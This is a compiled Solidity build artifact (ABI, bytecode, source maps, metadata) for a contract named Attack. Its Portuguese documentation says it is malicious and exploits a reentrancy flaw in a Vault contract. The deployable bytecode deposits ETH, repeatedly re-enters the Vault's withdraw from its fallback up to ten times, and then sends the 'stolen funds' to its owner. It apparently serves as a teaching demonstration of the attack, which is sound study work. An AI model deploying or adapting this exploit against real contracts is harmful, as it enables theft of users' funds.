{"abi":[{"type":"constructor","inputs":[{"name":"_vaultAddress","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"fallback","stateMutability":"payable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"MAX_ATTACKS","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"attackCount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getAttackCount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"vault","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Vault"}],"stateMutability":"view"},{"type":"function","name":"withdrawStolenFunds","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"event","name":"AttackCompleted","inputs":[{"name":"totalStolen","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false},{"type":"event","name":"AttackStarted","inputs":[{"name":"initialBalance","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false},{"type":"event","name":"ReentrancyExecuted","inputs":[{"name":"amount","type":"uint256","indexed":false,"internalType":"uint256"},{"name":"count","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5060405161062c38038061062c833981016040819052602b916057565b5f80546001600160a01b039092166001600160a01b031992831617905560018054909116331790556082565b5f602082840312156066575f5ffd5b81516001600160a01b0381168114607b575f5ffd5b9392505050565b61059d8061008f5f395ff3fe60806040526004361061007e575f3560e01c8063b36303fe1161004d578063b36303fe146101ef578063e942550a14610203578063fbfa77cf14610217578063fd276754146102355761014d565b806312065fe01461017a578063407c28211461019b5780638da5cb5b146101b05780639e5faafc146101e75761014d565b3661014d57600a60025410801561009f57505f546001600160a01b03163115155b1561014b5760028054905f6100b383610543565b90915550506002546040805134815260208101929092527fe1cc25e5821b33a6d98d9ef7f86a3312600a5bbabd022d2e5a2535ceb56fb0b0910160405180910390a15f805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b158015610134575f5ffd5b505af1158015610146573d5f5f3e3d5ffd5b505050505b005b600a60025410801561009f57505f546001600160a01b0316311561014b5760028054905f6100b383610543565b348015610185575f5ffd5b50475b6040519081526020015b60405180910390f35b3480156101a6575f5ffd5b5061018860025481565b3480156101bb575f5ffd5b506001546101cf906001600160a01b031681565b6040516001600160a01b039091168152602001610192565b61014b610249565b3480156101fa575f5ffd5b50610188600a81565b34801561020e575f5ffd5b50600254610188565b348015610222575f5ffd5b505f546101cf906001600160a01b031681565b348015610240575f5ffd5b5061014b6103ee565b670de0b6b3a76400003410156102a65760405162461bcd60e51b815260206004820152601d60248201527f4e656564206174206c6561737420312045544820746f2061747461636b00000060448201526064015b60405180910390fd5b5f54670de0b6b3a76400006001600160a01b039091163110156102fc5760405162461bcd60e51b815260206004820152600e60248201526d5661756c7420697320656d70747960901b604482015260640161029d565b5f546040516001600160a01b039091163181527f33f040bcc293552b556fb3082b0e9fb26495aeae16ef365bd761c702978eec0a9060200160405180910390a15f805460408051630d0e30db60e41b815290516001600160a01b039092169263d0e30db0923492600480820193929182900301818588803b15801561037f575f5ffd5b505af1158015610391573d5f5f3e3d5ffd5b50505f805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b1580156103d6575f5ffd5b505af11580156103e8573d5f5f3e3d5ffd5b50505050565b6001546001600160a01b031633146104355760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b604482015260640161029d565b478061047a5760405162461bcd60e51b81526020600482015260146024820152734e6f2066756e647320746f20776974686472617760601b604482015260640161029d565b6040518181527f4ef6191345aae76824ed25ff5065e33a8fbbb5a05823ebba2291fc6237a925f99060200160405180910390a16001546040515f916001600160a01b03169083908381818185875af1925050503d805f81146104f7576040519150601f19603f3d011682016040523d82523d5f602084013e6104fc565b606091505b505090508061053f5760405162461bcd60e51b815260206004820152600f60248201526e151c985b9cd9995c8819985a5b1959608a1b604482015260640161029d565b5050565b5f6001820161056057634e487b7160e01b5f52601160045260245ffd5b506001019056fea2646970667358221220b461b542f296f2dde1f31ab3192d3b81d2973f3fb58c705881050e066044bf4664736f6c634300081e0033","sourceMap":"288:2785:19:-:0;;;668:116;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;721:5;:28;;-1:-1:-1;;;;;721:28:19;;;-1:-1:-1;;;;;;721:28:19;;;;;;;759:18;;;;;767:10;759:18;;;288:2785;;14:298:22;92:6;145:2;133:9;124:7;120:23;116:32;113:52;;;161:1;158;151:12;113:52;187:16;;-1:-1:-1;;;;;232:31:22;;222:42;;212:70;;278:1;275;268:12;212:70;301:5;14:298;-1:-1:-1;;;14:298:22:o;:::-;288:2785:19;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x60806040526004361061007e575f3560e01c8063b36303fe1161004d578063b36303fe146101ef578063e942550a14610203578063fbfa77cf14610217578063fd276754146102355761014d565b806312065fe01461017a578063407c28211461019b5780638da5cb5b146101b05780639e5faafc146101e75761014d565b3661014d57600a60025410801561009f57505f546001600160a01b03163115155b1561014b5760028054905f6100b383610543565b90915550506002546040805134815260208101929092527fe1cc25e5821b33a6d98d9ef7f86a3312600a5bbabd022d2e5a2535ceb56fb0b0910160405180910390a15f805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b158015610134575f5ffd5b505af1158015610146573d5f5f3e3d5ffd5b505050505b005b600a60025410801561009f57505f546001600160a01b0316311561014b5760028054905f6100b383610543565b348015610185575f5ffd5b50475b6040519081526020015b60405180910390f35b3480156101a6575f5ffd5b5061018860025481565b3480156101bb575f5ffd5b506001546101cf906001600160a01b031681565b6040516001600160a01b039091168152602001610192565b61014b610249565b3480156101fa575f5ffd5b50610188600a81565b34801561020e575f5ffd5b50600254610188565b348015610222575f5ffd5b505f546101cf906001600160a01b031681565b348015610240575f5ffd5b5061014b6103ee565b670de0b6b3a76400003410156102a65760405162461bcd60e51b815260206004820152601d60248201527f4e656564206174206c6561737420312045544820746f2061747461636b00000060448201526064015b60405180910390fd5b5f54670de0b6b3a76400006001600160a01b039091163110156102fc5760405162461bcd60e51b815260206004820152600e60248201526d5661756c7420697320656d70747960901b604482015260640161029d565b5f546040516001600160a01b039091163181527f33f040bcc293552b556fb3082b0e9fb26495aeae16ef365bd761c702978eec0a9060200160405180910390a15f805460408051630d0e30db60e41b815290516001600160a01b039092169263d0e30db0923492600480820193929182900301818588803b15801561037f575f5ffd5b505af1158015610391573d5f5f3e3d5ffd5b50505f805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b1580156103d6575f5ffd5b505af11580156103e8573d5f5f3e3d5ffd5b50505050565b6001546001600160a01b031633146104355760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b604482015260640161029d565b478061047a5760405162461bcd60e51b81526020600482015260146024820152734e6f2066756e647320746f20776974686472617760601b604482015260640161029d565b6040518181527f4ef6191345aae76824ed25ff5065e33a8fbbb5a05823ebba2291fc6237a925f99060200160405180910390a16001546040515f916001600160a01b03169083908381818185875af1925050503d805f81146104f7576040519150601f19603f3d011682016040523d82523d5f602084013e6104fc565b606091505b505090508061053f5760405162461bcd60e51b815260206004820152600f60248201526e151c985b9cd9995c8819985a5b1959608a1b604482015260640161029d565b5050565b5f6001820161056057634e487b7160e01b5f52601160045260245ffd5b506001019056fea2646970667358221220b461b542f296f2dde1f31ab3192d3b81d2973f3fb58c705881050e066044bf4664736f6c634300081e0033","sourceMap":"288:2785:19:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;477:2;1556:11;;:25;:55;;;;-1:-1:-1;1610:1:19;1593:5;-1:-1:-1;;;;;1593:5:19;1585:22;:26;;1556:55;1552:333;;;1627:11;:13;;;:11;:13;;;:::i;:::-;;;;-1:-1:-1;;1702:11:19;;1672:42;;;1691:9;425:25:22;;481:2;466:18;;459:34;;;;1672:42:19;;398:18:22;1672:42:19;;;;;;;1858:5;;;:16;;;-1:-1:-1;;;1858:16:19;;;;-1:-1:-1;;;;;1858:5:19;;;;:14;;:16;;;;;;;;;;:5;;:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1552:333;288:2785;;477:2;2046:11;;:25;:55;;;;-1:-1:-1;2100:1:19;2083:5;-1:-1:-1;;;;;2083:5:19;2075:22;:26;2042:190;;2117:11;:13;;;:11;:13;;;:::i;2801:99::-;;;;;;;;;;-1:-1:-1;2872:21:19;2801:99;;;650:25:22;;;638:2;623:18;2801:99:19;;;;;;;;407:26;;;;;;;;;;;;;;;;334:20;;;;;;;;;;-1:-1:-1;334:20:19;;;;-1:-1:-1;;;;;334:20:19;;;;;;-1:-1:-1;;;;;850:32:22;;;832:51;;820:2;805:18;334:20:19;686:203:22;871:450:19;;;:::i;439:40::-;;;;;;;;;;;;477:2;439:40;;2978:93;;;;;;;;;;-1:-1:-1;3053:11:19;;2978:93;;310:18;;;;;;;;;;-1:-1:-1;310:18:19;;;;-1:-1:-1;;;;;310:18:19;;;2331:392;;;;;;;;;;;;;:::i;871:450::-;937:7;924:9;:20;;916:62;;;;-1:-1:-1;;;916:62:19;;1327:2:22;916:62:19;;;1309:21:22;1366:2;1346:18;;;1339:30;1405:31;1385:18;;;1378:59;1454:18;;916:62:19;;;;;;;;;1004:5;;1022:7;-1:-1:-1;;;;;1004:5:19;;;996:22;:33;;988:60;;;;-1:-1:-1;;;988:60:19;;1685:2:22;988:60:19;;;1667:21:22;1724:2;1704:18;;;1697:30;-1:-1:-1;;;1743:18:22;;;1736:44;1797:18;;988:60:19;1483:338:22;988:60:19;1094:5;;1072:37;;-1:-1:-1;;;;;1094:5:19;;;1086:22;650:25:22;;1072:37:19;;638:2:22;623:18;1072:37:19;;;;;;;1171:5;;;:33;;;-1:-1:-1;;;1171:33:19;;;;-1:-1:-1;;;;;1171:5:19;;;;:13;;1192:9;;1171:33;;;;;:5;:33;;;;;;1192:9;1171:5;:33;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1298:5:19;;;:16;;;-1:-1:-1;;;1298:16:19;;;;-1:-1:-1;;;;;1298:5:19;;;;-1:-1:-1;1298:14:19;;-1:-1:-1;1298:16:19;;;;;-1:-1:-1;1298:16:19;;;;;;:5;;:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;871:450::o;2331:392::-;2403:5;;-1:-1:-1;;;;;2403:5:19;2389:10;:19;2381:42;;;;-1:-1:-1;;;2381:42:19;;2028:2:22;2381:42:19;;;2010:21:22;2067:2;2047:18;;;2040:30;-1:-1:-1;;;2086:18:22;;;2079:40;2136:18;;2381:42:19;1826:334:22;2381:42:19;2465:21;2504:16;2496:49;;;;-1:-1:-1;;;2496:49:19;;2367:2:22;2496:49:19;;;2349:21:22;2406:2;2386:18;;;2379:30;-1:-1:-1;;;2425:18:22;;;2418:50;2485:18;;2496:49:19;2165:344:22;2496:49:19;2569:29;;650:25:22;;;2569:29:19;;638:2:22;623:18;2569:29:19;;;;;;;2636:5;;:35;;2618:12;;-1:-1:-1;;;;;2636:5:19;;2654:12;;2618;2636:35;2618:12;2636:35;2654:12;2636:5;:35;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2617:54;;;2689:7;2681:35;;;;-1:-1:-1;;;2681:35:19;;2926:2:22;2681:35:19;;;2908:21:22;2965:2;2945:18;;;2938:30;-1:-1:-1;;;2984:18:22;;;2977:45;3039:18;;2681:35:19;2724:339:22;2681:35:19;2371:352;;2331:392::o;14:232:22:-;53:3;74:17;;;71:140;;133:10;128:3;124:20;121:1;114:31;168:4;165:1;158:15;196:4;193:1;186:15;71:140;-1:-1:-1;238:1:22;227:13;;14:232::o","linkReferences":{}},"methodIdentifiers":{"MAX_ATTACKS()":"b36303fe","attack()":"9e5faafc","attackCount()":"407c2821","getAttackCount()":"e942550a","getBalance()":"12065fe0","owner()":"8da5cb5b","vault()":"fbfa77cf","withdrawStolenFunds()":"fd276754"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_vaultAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalStolen\",\"type\":\"uint256\"}],\"name\":\"AttackCompleted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"initialBalance\",\"type\":\"uint256\"}],\"name\":\"AttackStarted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"count\",\"type\":\"uint256\"}],\"name\":\"ReentrancyExecuted\",\"type\":\"event\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"MAX_ATTACKS\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"attackCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getAttackCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"vault\",\"outputs\":[{\"internalType\":\"contract Vault\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawStolenFunds\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"author\":\"Ricardo Silva\",\"details\":\"Contrato malicioso que explora a vulnerabilidade de reentr\\u00e2ncia no Vault\",\"kind\":\"dev\",\"methods\":{\"attack()\":{\"details\":\"Inicia o ataque depositando ETH e depois sacando\"},\"getAttackCount()\":{\"details\":\"Retorna o n\\u00famero de ataques executados\"},\"getBalance()\":{\"details\":\"Retorna o balance do contrato de ataque\"},\"withdrawStolenFunds()\":{\"details\":\"Retira todo o ETH roubado para o endere\\u00e7o do atacante\"}},\"title\":\"Attack\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"notice\":\"Este contrato demonstra como um ataque de reentr\\u00e2ncia funciona\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/Attack.sol\":\"Attack\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[\":forge-std/=lib/forge-std/src/\"]},\"sources\":{\"src/Attack.sol\":{\"keccak256\":\"0x863df167172b5b8231a7a9b7dbd2d9790012370372721b66ada5db313020a311\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://16ce21109e7b2791583fd06cfe24d486d6abb4dbeea4a7477f2089b6dfc76a4f\",\"dweb:/ipfs/Qmf6iaWeu9fCEbNAAkRuDRtn25Csb4TxAVLZBw1W47Ttii\"]},\"src/Vault.sol\":{\"keccak256\":\"0x6f479c093e67e9d1b9f530272bd0c0922efe0b458e0c44c08e89e7d8587651e2\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://acef45c42649c3739fc9b534ba72aae92e94fcb58013a74c81c963387b03750f\",\"dweb:/ipfs/Qmc8wssiKcqoDsiysUjjTAGGEmRJNfc7iRE6p1jroYhoWy\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address payable","name":"_vaultAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"uint256","name":"totalStolen","type":"uint256","indexed":false}],"type":"event","name":"AttackCompleted","anonymous":false},{"inputs":[{"internalType":"uint256","name":"initialBalance","type":"uint256","indexed":false}],"type":"event","name":"AttackStarted","anonymous":false},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256","indexed":false},{"internalType":"uint256","name":"count","type":"uint256","indexed":false}],"type":"event","name":"ReentrancyExecuted","anonymous":false},{"inputs":[],"stateMutability":"payable","type":"fallback"},{"inputs":[],"stateMutability":"view","type":"function","name":"MAX_ATTACKS","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"payable","type":"function","name":"attack"},{"inputs":[],"stateMutability":"view","type":"function","name":"attackCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"getAttackCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}]},{"inputs":[],"stateMutability":"view","type":"function","name":"vault","outputs":[{"internalType":"contract Vault","name":"","type":"address"}]},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"withdrawStolenFunds"},{"inputs":[],"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{"attack()":{"details":"Inicia o ataque depositando ETH e depois sacando"},"getAttackCount()":{"details":"Retorna o número de ataques executados"},"getBalance()":{"details":"Retorna o balance do contrato de ataque"},"withdrawStolenFunds()":{"details":"Retira todo o ETH roubado para o endereço do atacante"}},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["forge-std/=lib/forge-std/src/"],"optimizer":{"enabled":true,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/Attack.sol":"Attack"},"evmVersion":"prague","libraries":{}},"sources":{"src/Attack.sol":{"keccak256":"0x863df167172b5b8231a7a9b7dbd2d9790012370372721b66ada5db313020a311","urls":["bzz-raw://16ce21109e7b2791583fd06cfe24d486d6abb4dbeea4a7477f2089b6dfc76a4f","dweb:/ipfs/Qmf6iaWeu9fCEbNAAkRuDRtn25Csb4TxAVLZBw1W47Ttii"],"license":"MIT"},"src/Vault.sol":{"keccak256":"0x6f479c093e67e9d1b9f530272bd0c0922efe0b458e0c44c08e89e7d8587651e2","urls":["bzz-raw://acef45c42649c3739fc9b534ba72aae92e94fcb58013a74c81c963387b03750f","dweb:/ipfs/Qmc8wssiKcqoDsiysUjjTAGGEmRJNfc7iRE6p1jroYhoWy"],"license":"MIT"}},"version":1},"id":19}